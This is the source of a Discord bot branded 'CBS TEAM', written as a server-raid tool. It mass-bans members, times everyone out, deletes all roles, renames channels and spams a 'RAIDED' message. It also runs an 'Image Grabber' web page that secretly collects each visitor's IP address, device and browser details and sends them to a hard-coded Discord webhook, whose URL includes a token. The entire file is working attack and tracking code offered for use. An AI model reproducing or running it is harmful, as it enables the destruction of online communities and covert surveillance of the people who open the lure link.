const { Client, GatewayIntentBits, REST, Routes, Collection, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const dotenv = require('dotenv');
const cron = require('node-cron');
const express = require('express');
const fs = require('fs');
const path = require('path');

dotenv.config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ]
});

client.commands = new Collection();
client.menuCommands = new Collection();

const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));
const commands = [];

for (const file of commandFiles) {
  const command = require(`./commands/${file}`);
  if (command.data) {
    client.commands.set(command.data.name, command);
    commands.push(command.data.toJSON());
  }
  if (command.name) {
    client.menuCommands.set(command.name, command);
  }
}

client.once('ready', async () => {
  console.log(`✅ ${client.user.tag} está online!`);
  console.log(`📊 Servidores: ${client.guilds.cache.size}`);

  const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
  try {
    console.log('🔄 Registrando comandos...');
    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands }
    );
    console.log(`✅ ${commands.length} comandos registrados!`);
  } catch (error) {
    console.error('❌ Erro:', error);
  }

  client.user.setPresence({
    activities: [{ name: '!menu | CBS TEAM', type: 3 }],
    status: 'online'
  });

  cron.schedule('*/5 * * * *', () => console.log('🔄 Keep-alive'));
  console.log('📋 Digite !menu no Discord');
  console.log('📸 Digite /img para gerar Image Grabber');
});

client.on('interactionCreate', async interaction => {
  if (interaction.isCommand()) {
    const command = client.commands.get(interaction.commandName);
    if (!command) return;
    try {
      await command.execute(interaction, client);
    } catch (error) {
      console.error(error);
      await interaction.reply({ content: '❌ Erro.', flags: 64 });
    }
  }
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  const modalId = interaction.customId;

  if (modalId === 'editRaidModal') {
    const categoria = interaction.fields.getTextInputValue('categoriaInput');
    const mensagem = interaction.fields.getTextInputValue('mensagemInput');
    const config = require('./config');
    if (categoria) config.raid.baseName = categoria;
    if (mensagem) config.raid.spamMessage = mensagem;
    await interaction.reply({
      content: `✅ **CONFIGURAÇÕES ATUALIZADAS!**\n📂 Categoria: \`${categoria || 'mantida'}\`\n💬 Mensagem: \`${mensagem || 'mantida'}\``,
      flags: 64
    });
  }

  if (modalId === 'renameModal') {
    const tipo = interaction.fields.getTextInputValue('tipoInput').toLowerCase();
    const nome = interaction.fields.getTextInputValue('nomeInput');
    const guild = interaction.guild;
    if (tipo === 'canal') {
      const channels = guild.channels.cache.filter(c => c.type === 0);
      let count = 0;
      for (const [id, ch] of channels) {
        try { await ch.setName(nome); count++; } catch {}
      }
      await interaction.reply({ content: `✅ ${count} canais renomeados para \`${nome}\``, flags: 64 });
    } else if (tipo === 'categoria') {
      const categories = guild.channels.cache.filter(c => c.type === 4);
      let count = 0;
      for (const [id, cat] of categories) {
        try { await cat.setName(nome); count++; } catch {}
      }
      await interaction.reply({ content: `✅ ${count} categorias renomeadas para \`${nome}\``, flags: 64 });
    } else {
      await interaction.reply({ content: '❌ Tipo inválido! Use "canal" ou "categoria"', flags: 64 });
    }
  }

  if (modalId === 'banAllModal') {
    const motivo = interaction.fields.getTextInputValue('motivoInput') || 'RAID BY CBS TEAM';
    const guild = interaction.guild;
    const botId = interaction.client.user.id;
    const members = guild.members.cache.filter(m => m.id !== botId && !m.user.bot);
    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 });
    await interaction.reply({ content: `🔨 BANINDO ${members.size} membros...`, flags: 64 });
    let banidos = 0;
    const list = [...members.values()];
    for (let i = 0; i < list.length; i += 10) {
      const chunk = list.slice(i, i + 10);
      await Promise.all(chunk.map(m => m.ban({ reason: motivo }).catch(() => {})));
      banidos += chunk.length;
      await interaction.editReply(`🔨 ${banidos}/${members.size} banidos`);
    }
    await interaction.editReply(`✅ **${banidos} MEMBROS BANIDOS!**`);
  }

  if (modalId === 'endModal') {
    const minutos = parseInt(interaction.fields.getTextInputValue('minutosInput')) || 60;
    const duracao = minutos * 60 * 1000;
    const guild = interaction.guild;
    const botId = interaction.client.user.id;
    const members = guild.members.cache.filter(m => m.id !== botId);
    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 });
    await interaction.reply({ content: `⏰ TIMEOUT em ${members.size} membros...`, flags: 64 });
    let timeoutados = 0;
    const list = [...members.values()];
    for (let i = 0; i < list.length; i += 10) {
      const chunk = list.slice(i, i + 10);
      await Promise.all(chunk.map(m => m.timeout(duracao, 'RAID CBS').catch(() => {})));
      timeoutados += chunk.length;
      await interaction.editReply(`⏰ ${timeoutados}/${members.size} timeout`);
    }
    await interaction.editReply(`✅ **${timeoutados} MEMBROS EM TIMEOUT POR ${minutos} MIN!**`);
  }
});

client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (!message.content.startsWith('!')) return;
  const args = message.content.slice(1).trim().split(/ +/);
  const commandName = args.shift().toLowerCase();
  const command = client.menuCommands.get(commandName);
  if (!command) return;
  try {
    await command.execute(message, args, client);
  } catch (error) {
    console.error(error);
    await message.reply('❌ Erro.');
  }
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  const mensagemSpam = 
    `**RAIDED BY CBS TEAM** https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif ꧁꧂꧁꧂꧁꧂**꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂`;

  if (interaction.customId === 'spam1') {
    await interaction.deferReply({ flags: 64 });
    const channel = interaction.channel;
    let enviadas = 0;
    for (let i = 0; i < 1; i++) {
      try { await channel.send({ content: mensagemSpam }); enviadas++; } catch {}
    }
    await interaction.editReply(`✅ **${enviadas} mensagem enviada!** 💬`);
    return;
  }

  if (interaction.customId === 'spam2') {
    await interaction.deferReply({ flags: 64 });
    const channel = interaction.channel;
    let enviadas = 0;
    for (let i = 0; i < 2; i++) {
      try { await channel.send({ content: mensagemSpam }); enviadas++; } catch {}
    }
    await interaction.editReply(`✅ **${enviadas} mensagens enviadas!** 💬`);
    return;
  }

  const cmdMap = {
    'nuke': 'nuke',
    'editraid': 'editraid',
    'rename': 'rename',
    'banall': 'banall',
    'end': 'end',
    'deleterole': 'deleterole'
  };
  const cmdName = cmdMap[interaction.customId];
  if (cmdName) {
    const cmd = client.commands.get(cmdName);
    if (cmd) {
      try {
        await cmd.execute(interaction, client);
      } catch (error) {
        console.error(error);
        await interaction.reply({ content: '❌ Erro.', flags: 64 });
      }
    }
    return;
  }

  if (interaction.customId === 'confirmDeleteRoles') {
    const guild = interaction.guild;
    const roles = guild.roles.cache.filter(r => r.id !== guild.id);
    await interaction.deferReply({ flags: 64 });
    let deletados = 0;
    const list = [...roles.values()];
    for (let i = 0; i < list.length; i += 10) {
      const chunk = list.slice(i, i + 10);
      await Promise.all(chunk.map(r => r.delete().catch(() => {})));
      deletados += chunk.length;
      await interaction.editReply(`🗑️ ${deletados}/${roles.size} deletados`);
    }
    await interaction.editReply(`✅ **${deletados} CARGOS DELETADOS!**`);
  }

  if (interaction.customId === 'cancelDeleteRoles') {
    await interaction.reply({ content: '❌ Cancelado.', flags: 64 });
  }
});

// ==================== SERVIDOR HTTP ====================
const app = express();
const port = process.env.PORT || 3000;
app.use(express.static('public'));
app.use(express.json());

// Armazena dados
const ipData = {};
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1528810633750122506/Rl3CpBXoq4Q14pMHMlX_ZHmJwSjK9TPJzqMu3rrpI6RFoO-HwMrsEnEzXjaz_ram4_MO';

// Função para enviar para o webhook
async function enviarWebhook(id, dados) {
  if (!dados) return;
  const embed = {
    title: '📸 NOVO CLIQUE CAPTURADO!',
    color: 0xFF0000,
    fields: [
      { name: '🌐 IP', value: dados.ip || 'Desconhecido', inline: true },
      { name: '💻 Dispositivo', value: dados.device || 'Desconhecido', inline: true },
      { name: '🌍 Navegador', value: dados.browser || 'Desconhecido', inline: true },
      { name: '📱 SO', value: dados.os || 'Desconhecido', inline: true },
      { name: '🖥️ Resolução', value: dados.resolution || 'Desconhecido', inline: true },
      { name: '🌐 Idioma', value: dados.language || 'Desconhecido', inline: true },
      { name: '🕐 Timezone', value: dados.timezone || 'Desconhecido', inline: true },
      { name: '📱 User-Agent', value: dados.userAgent || 'Desconhecido', inline: false },
      { name: '📅 Data/Hora', value: dados.timestamp || 'Desconhecido', inline: true },
      { name: '🆔 ID', value: `\`${id}\``, inline: true }
    ],
    footer: { text: 'CBS TEAM - Image Grabber' },
    timestamp: new Date()
  };
  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (e) {}
}

// Rota para servir a página com a imagem e captura de dados
app.get('/img/:id', (req, res) => {
  const id = req.params.id;
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>CBS TEAM</title>
      <meta property="og:image" content="https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif">
      <style>
        body { margin:0; display:flex; justify-content:center; align-items:center; height:100vh; background:#0a0a0a; flex-direction:column; font-family:Arial; }
        img { max-width:90%; max-height:90%; border-radius:10px; }
        .loading { color:#ff0000; font-size:18px; margin-top:20px; animation:pulse 2s infinite; }
        @keyframes pulse { 0%{opacity:0.3;} 50%{opacity:1;} 100%{opacity:0.3;} }
      </style>
    </head>
    <body>
      <img src="https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif" alt="CBS TEAM">
      <div class="loading">🔥 CBS TEAM ESTEVE AQUI!</div>
      <script>
        const data = {
          resolution: window.screen.width + 'x' + window.screen.height,
          language: navigator.language || navigator.languages[0],
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        };
        fetch('/api/coletar/${id}', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        }).then(() => console.log('✅ Dados enviados'))
          .catch(err => console.log('❌ Erro:', err));
      </script>
    </body>
    </html>
  `);
});

// Rota para receber dados do navegador
app.post('/api/coletar/:id', express.json(), async (req, res) => {
  const id = req.params.id;
  const navegadorData = req.body;
  const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'] || navegadorData.userAgent || 'Desconhecido';

  let device = 'Desconhecido', browser = 'Desconhecido', os = 'Desconhecido';
  if (userAgent) {
    if (userAgent.includes('Windows')) os = 'Windows';
    else if (userAgent.includes('Mac')) os = 'MacOS';
    else if (userAgent.includes('Linux')) os = 'Linux';
    else if (userAgent.includes('Android')) os = 'Android';
    else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
    if (userAgent.includes('Chrome')) browser = 'Chrome';
    else if (userAgent.includes('Firefox')) browser = 'Firefox';
    else if (userAgent.includes('Safari')) browser = 'Safari';
    else if (userAgent.includes('Edge')) browser = 'Edge';
    else if (userAgent.includes('Opera')) browser = 'Opera';
    if (userAgent.includes('Mobile')) device = 'Celular';
    else if (userAgent.includes('Tablet')) device = 'Tablet';
    else device = 'Computador';
  }

  const dadosCompletos = {
    ip: userIP,
    device: `${device} (${os})`,
    browser: browser,
    os: os,
    resolution: navegadorData.resolution || 'Desconhecido',
    language: navegadorData.language || 'Desconhecido',
    timezone: navegadorData.timezone || 'Desconhecido',
    userAgent: userAgent,
    timestamp: navegadorData.timestamp || new Date().toISOString()
  };

  ipData[id] = dadosCompletos;
  await enviarWebhook(id, dadosCompletos);
  res.json({ status: 'ok' });
});

// Rota para ver dados brutos
app.get('/dados/:id', (req, res) => {
  const id = req.params.id;
  if (ipData[id]) res.json(ipData[id]);
  else res.json({ error: 'Dados não encontrados' });
});

// Rota principal
app.get('/', (req, res) => res.send('🤖 CBS TEAM BOT ONLINE!'));

app.listen(port, () => {
  console.log(`🌐 HTTP rodando na porta ${port}`);
  console.log(`📸 Image Grabber: https://cbsteam.onrender.com/img/ID`);
  console.log(`📨 Webhook configurado: ${WEBHOOK_URL}`);
});

// ==================== LOGIN ====================
client.login(process.env.DISCORD_TOKEN);

process.on('unhandledRejection', error => console.error('❌ Erro não tratado:', error));
process.on('uncaughtException', error => console.error('❌ Exceção não capturada:', error));